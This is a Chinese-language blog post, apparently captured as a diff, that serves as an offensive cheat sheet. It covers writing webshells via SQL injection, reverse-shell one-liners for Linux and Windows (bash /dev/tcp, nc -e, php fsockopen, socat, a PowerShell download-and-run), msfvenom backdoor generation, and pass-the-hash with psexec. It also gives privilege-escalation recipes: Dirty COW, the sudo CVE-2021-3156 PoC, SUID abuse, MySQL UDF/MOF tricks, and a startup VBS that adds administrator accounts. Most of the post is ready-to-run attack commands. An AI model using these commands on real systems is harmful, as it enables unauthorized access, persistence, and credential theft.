+<h6 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h6><p>前文已提过sql注入的原理，通过sql注入可以查询敏感数据。同时，当数据库具有写权限和写入条件时，就可以写如webshell。</p>
+<p>条件（mysql）：</p>
+<p>网站物理路径</p>
+<p>文件写入权限</p>
+<p>secure_file_priv参数项不为NULL</p>
+<p>方式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">into outfile</span></span><br><span class="line">导出多行，但会自动换行、转义更改数据格式</span><br><span class="line">e.g. select &lt;?php phpinfo(); ?&gt; into outfile &#x27;/var/www/html/muma.php&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">into dumpfile</span></span><br><span class="line">只能导出一行数据，但不会更改数据格式</span><br><span class="line">e.g. select &lt;?php phpinfo(); ?&gt; into dumpfile &#x27;/var/www/html/muma.php&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">作为分隔符导出</span></span><br><span class="line">e.g. into outfile &#x27;/var/www/html/muma.php&#x27; lines terminated by &#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">后台数据库备份</span></span><br><span class="line">登录到后台，有的站点可以备份数据库，插入webshell，备份并修改后缀名</span><br></pre></td></tr></table></figure>
+
+<h6 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h6><p>模板修改获取webshell</p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>（Reverse Shell）攻击者监听一个端口，受害者发送请求到该端口，并将其命令行的输入输出转到受害者终端。常用来做权限提升和内网通道。一些大马也能直接反弹shell。</p>
+<p>攻击方接收</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444 </span><br></pre></td></tr></table></figure>
+
+<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><p>bash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.19.128/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>nc</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.19.128 4444</span><br></pre></td></tr></table></figure>
+
+<p>curl</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先将bash反弹写入bash.html,开启web服务</span><br><span class="line">curl 127.0.0.1/bash.html|bash</span><br></pre></td></tr></table></figure>
+
+<p>whois</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whois -h 192.168.19.128 -p 4444 `pwd`</span><br><span class="line">反弹的shell只能执行``内的命令</span><br></pre></td></tr></table></figure>
+
+<p>socat</p>
+<p>类似nc </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.19.128:4444</span><br></pre></td></tr></table></figure>
+
+<p>php</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.19.128&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p>nc</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.19.128 4444 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>powercat</p>
+<p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/besimorhino/powercat  #下载</span><br><span class="line">Import-Module ./powercat.psl</span><br><span class="line">powercat -c 192.168.19.128 -p 4444 -e cmd</span><br></pre></td></tr></table></figure>
+
+<p>msfvenom</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep &#x27;cmd/windows/reverse&#x27;  #查看payload列表</span><br><span class="line">msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.19.128 LPORT=4444  #生成payload</span><br><span class="line">powershell 执行 payload</span><br></pre></td></tr></table></figure>
+
+<p>CS</p>
+<p>Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvR32等进行反弹shell，类似metasploit的web_delivery模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">服务端：</span><br><span class="line">./teamserver 192.168.19.129 123</span><br><span class="line">客户端：</span><br><span class="line">运行&amp;登录</span><br><span class="line">Listeners监听：payload</span><br><span class="line">Attack：生成powershell payload</span><br><span class="line">运行</span><br></pre></td></tr></table></figure>
+
+<h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><p>反弹shell一般都是普通shell，无法使用vim等文本编辑器，不能补全和su等，我们可以将其提升完全交互式shell</p>
+<h5 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h5><p>python</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">基于kali攻击方</span></span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;  #python</span><br><span class="line">Ctrl+Z                 #挂起到后台</span><br><span class="line">stty raw -echo         #禁止回显并设置原始输入，终端不再显示命令</span><br><span class="line">fg                     #把挂起的程序放回终端</span><br><span class="line">回车</span><br><span class="line">reset                  #将终端恢复至原始状态，之前输入信息将被清空</span><br><span class="line">export SHELL=bash</span><br><span class="line"></span><br><span class="line">exit                   #退出终端</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+<p>socat</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">靶机</span></span><br><span class="line">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat</span><br><span class="line">chmod +x /tmp/socat</span><br><span class="line">/tmp/socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.19.128:4444</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">攻击方</span></span><br><span class="line">socat file:`tty`,raw,echo=0 TCP-LISTEN:4444</span><br></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NetcatUP:https://github.com/Charliedean/NetcatUP</span><br></pre></td></tr></table></figure>
+
+<p>shell</p>
+<p>利用script指令，在弹回来的 shell 下创建一个带有 tty 的 shell, 这样就可以勉强使用一下 top 和 vim</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null</span><br></pre></td></tr></table></figure>
+
+<h5 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h5><p>Invoke-ConPtyShell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">攻击方</span></span><br><span class="line">stty raw -echo; (stty size; cat) | nc -lvnp 4444</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">靶机</span></span><br><span class="line">IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.19.128 4444</span><br></pre></td></tr></table></figure>
+
+<h5 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">设置handler监听</span></span><br><span class="line">use multi/handler</span><br><span class="line">set PAYLOAD php/reverse_php</span><br><span class="line">set LHOST 1.1.1.1</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h6 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#框架</span><br><span class="line">one-lin3r pip3安装</span><br><span class="line"></span><br><span class="line">#工具</span><br><span class="line">HackTools：https://github.com/s7ckTeam/HackTools</span><br><span class="line">revshellgen https://www.uedbox.com/post/59210/</span><br><span class="line">msfvenom自动补全工具：https://ohmyz.sh/</span><br><span class="line"></span><br><span class="line">密码获取工具：</span><br><span class="line">LaZagne：https://github.com/AlessandroZ/LaZagne</span><br><span class="line">mimkatz</span><br><span class="line">http://blog.leanote.com/post/snowming/c3df6d7f131f</span><br></pre></td></tr></table></figure>
+
+<h6 id="hash密码远程攻击"><a href="#hash密码远程攻击" class="headerlink" title="hash密码远程攻击"></a>hash密码远程攻击</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">Ophcrack暴力破解</span></span><br><span class="line">C：\Windows\System32\Config\SAM</span><br><span class="line"><span class="meta">#</span><span class="bash">基于2019kali msf</span></span><br><span class="line">msf &gt;use exploit/windows/smb/psexec </span><br><span class="line">msf &gt;set RHOST 192.168.1.109 </span><br><span class="line">msf &gt;set SMBUser administrator </span><br><span class="line">msf &gt;set SMBPass 44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4 </span><br><span class="line">msf &gt;exploit</span><br><span class="line">msf &gt;shell</span><br></pre></td></tr></table></figure>
+
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>除了上面提到的交互式shell，我们还可以进行提权</p>
+<h5 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h5><p>一般我们拿到webshell，只是拿到了网站的权限，这时的shell还不能执行系统操作。这就需要进行提权。</p>
+<p>所谓提权指的是将某个用户提升为比自己权限高的用户，就是提权，比如windows操作系统的普通用户提升为管理员。甚至system权限。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">windows常用指令</span></span><br><span class="line">whoami         #查看用户权限</span><br><span class="line">systeminfo     #查看操作系统</span><br><span class="line">ipconfig       #查看当前服务器ip</span><br><span class="line">net user       #查看当前用户信息</span><br><span class="line">netstat        #查看端口连接</span><br><span class="line">tasklist       #查看当前进程信息</span><br><span class="line">taskkill -PID[]#结束进程</span><br><span class="line">net start      #启动服务</span><br><span class="line">net stop       #停止服务</span><br></pre></td></tr></table></figure>
+
+<h6 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h6><p>首先需要我们有目录写权限，然后找到一个和靶机主机版本一样的虚拟机，copy虚拟机系统中的cmd.exe并上传至靶机网站，再我们的shell终端执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">基于菜刀</span></span><br><span class="line">setp  C:\www\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>这时一些系统指令便可以执行了</p>
+<h6 id="exp提权"><a href="#exp提权" class="headerlink" title="exp提权"></a>exp提权</h6><p>利用系统漏洞进行提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">微软官网找公布的exp：</span></span><br><span class="line">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</span><br><span class="line">https://msrc.microsoft.com/update-guide/vulnerability</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">快速未打补丁的exp</span></span><br><span class="line">micropoor.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i &quot;%i&quot;|| @echo %i you can</span><br><span class="line">fuck)&amp;del /f /q /a micropoor.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">已公开的exp</span></span><br><span class="line">https://github.com/SecWiki/windows-kernel-exploits https://github.com/WindowsExploits/Exploits</span><br><span class="line">https://github.com/AusJock/Privilege-Escalation</span><br></pre></td></tr></table></figure>
+
+<h6 id="工具提权"><a href="#工具提权" class="headerlink" title="工具提权"></a>工具提权</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">pr</span></span><br><span class="line">pr.exe &quot;net uesr 123 123 /add&quot;</span><br></pre></td></tr></table></figure>
+
+<h6 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h6><p>针对windows 7/8/03/08/12/16</p>
+<p>sc是服务进程管理器和服务进行通信的命令行程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建syscmd服务</span></span><br><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">启动服务</span></span><br><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure>
+
+<p>MSF</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">msfvenom生成木马后门exe</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b &#x27;\x00&#x27; LHOST=192.168.19.128 LPORT=4444 -f exe &gt; abc.exe</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">监听</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.19.128</span><br><span class="line">set lport 4444</span><br><span class="line">show options</span><br><span class="line">exploit</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">提权</span></span><br><span class="line">shell</span><br><span class="line">getsystem</span><br></pre></td></tr></table></figure>
+
+<p>msf进程迁移提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">migrate [pid]</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<h5 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h5><p>常用系统指令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">uname -a         #打印所有可用的系统信息</span><br><span class="line">dir/ls -al       #显示当前目录文件</span><br><span class="line">pwd              #当前目录路径</span><br><span class="line">cd               #返回上一级/家目录</span><br><span class="line">cat              #查看文件内容，/etc/password、/etc/shadow</span><br><span class="line">more             #一页一页显示文件</span><br><span class="line">chmod            #修改文件</span><br><span class="line">find             #查找文件</span><br><span class="line">who              #查询目前和你使用同一台机器的人以及Login时间地点</span><br><span class="line">whoami           #当前用户</span><br><span class="line">w                #查看目前登录用户和在做什么</span><br><span class="line">last             #最后登录用户的列表</span><br><span class="line">lastlog          #所有用户上次登录的信息</span><br><span class="line">useradd          #添加用户</span><br><span class="line">groups [user]    #用户组</span><br><span class="line">history          #历史记录</span><br><span class="line">gcc              #编译c语言</span><br><span class="line">telnet [ip]      #telnet连接目标主机</span><br><span class="line">ftp              #ftp连接</span><br></pre></td></tr></table></figure>
+
+<h6 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看发行版本</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看内核版本</span></span><br><span class="line">uname -a</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查找exp</span></span><br><span class="line">searchsploit</span><br><span class="line">github</span><br></pre></td></tr></table></figure>
+
+<p>首先拿到反弹shell，下载poc并上传目标主机（需要写权限）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/FireFart/dirtycow</span><br><span class="line"></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">ls</span><br><span class="line">./dirty</span><br><span class="line">默认删除root并创建一个超级用户，su切换就可以了</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">还原(有提示)</span></span><br><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h6 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h6><p>利用存在漏洞的sudo版本在shell中运行sudoedit时，可能导致缓冲区溢出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">影响版本</span></span><br><span class="line">Sudo   1.8.2-1.8.31p2   1.9.0-1.9.5p1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">检测漏洞</span></span><br><span class="line">sudoedit -s /</span><br><span class="line">返回&quot;sudoedit:&quot;开头可能存在风险</span><br><span class="line">返回&quot;usage:&quot;开头则不受影响</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">poc</span></span><br><span class="line">https://haxx.in/CVE-2021-3156nsspoc_ubunt u.tar.gz</span><br><span class="line">tar -xvzf CVE-2021-3156_nss_poc_ubuntu.tar.gz</span><br><span class="line">cd CVE-2021-3156/</span><br><span class="line">make &amp;&amp;./sudo-hax-me-a-sandwich 0</span><br></pre></td></tr></table></figure>
+
+<h6 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查找suid权限文件（任选其一）</span></span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">常用suid提权文件</span></span><br><span class="line">Nmap Vim find Bash More Less Nano cp</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">某些版本带有交互模式，如namp2.02-5.21、find</span></span><br><span class="line">nmap --interactive</span><br><span class="line">msf模块也可以&gt; exploit/unix/local/setuid_nmap</span><br><span class="line"></span><br><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h5><p>获取webshell后，我们可以通过获取mysql数据库的账号密码来提权</p>
+<h6 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">root一般只能本地登录，需在本地远程授权</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT ALL PRIVILEGES ON *.* TO root@<span class="string">&quot;%&quot;</span> IDENTIFIED BY <span class="string">&quot;root&quot;</span>;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> flush privileges;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">通过查看网站配置文件或通过sql注入查看分析路径</span></span><br><span class="line">/data/mysql下的user.myd和user.myi</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">通过工具、脚本或在线查询破解<span class="built_in">hash</span></span></span><br><span class="line">hscan、Bruter、hydra</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">利用工具连接</span></span><br><span class="line">菜刀，mysql提权工具等</span><br></pre></td></tr></table></figure>
+
+<h6 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h6><p>是mysql自身功能的提权，无论什么版本都可以。上传udf动态链接库，有就不用上传了，没有对应目录就新建目录上传</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">路径（windows）</span></span><br><span class="line">mysql&lt;5.1:  c:\\WINDOWS\\udf.dll</span><br><span class="line">mysql=5.1:  C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll</span><br><span class="line">select @@plugin_dir; #或者查询plugin路径上传</span><br><span class="line">高版本也可以查找路径或查找默认路径</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">可以利用工具</span></span><br><span class="line">msf、sqlmap、mysql综合利用工具</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">mysql综合利用</span></span><br><span class="line">select cmdshell(&#x27;ver&#x27;);</span><br><span class="line">select cmdshell(&#x27;net user&#x27;);</span><br><span class="line">select cmdshell(&#x27;net localgroup administrators 123 /add&#x27;);</span><br><span class="line">Create Function open3389 returns string soname &#x27;udf.dll&#x27;;</span><br><span class="line">select open3389();</span><br><span class="line"></span><br><span class="line">若3306端口受限还需高版本udf</span><br></pre></td></tr></table></figure>
+
+<h6 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h6><p>适用于Windows</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过webshell数据库语句创建账号</span><br><span class="line">上传mof文件</span><br><span class="line">执行sql</span><br><span class="line">select load_file(&#x27;C:\\wmpub\\moon.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/moon.mof&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>然后者代码文件每隔一分钟被执行一次，会创建一个admin的用户，被删除后会重新创建</p>
+<p>还可以直接用msql综合利用工具创建账户</p>
+<h6 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\php\MySQL-5.1.50\bin&gt;mysql -uroot -proot -h 192.168.1.109</span><br><span class="line">mysql&gt;drop database test1;</span><br><span class="line">mysql&gt; create database test1;</span><br><span class="line">mysql&gt; use test1;</span><br><span class="line">mysql&gt; create table a (cmd text);</span><br><span class="line">mysql&gt;insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;)&quot;);</span><br><span class="line">mysql&gt;insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user best best /add&quot;&quot;,0)&quot;);</span><br><span class="line">mysql&gt;insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup Administrators best /add&quot;&quot;,0)&quot;);</span><br><span class="line">注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序</span><br><span class="line">mysql&gt;select * from a; mysql&gt;select * from a into outfile &quot;c://docume~1//administrator//「开始」菜单//程 序//启动//best.vbs&quot;;</span><br><span class="line">最后通过溢出漏洞让服务器重启服务，如：MS12-020、MS15-034</span><br></pre></td></tr></table></figure>
+
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><code>http://www.hackdig.com/04/hack-317631.htm</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
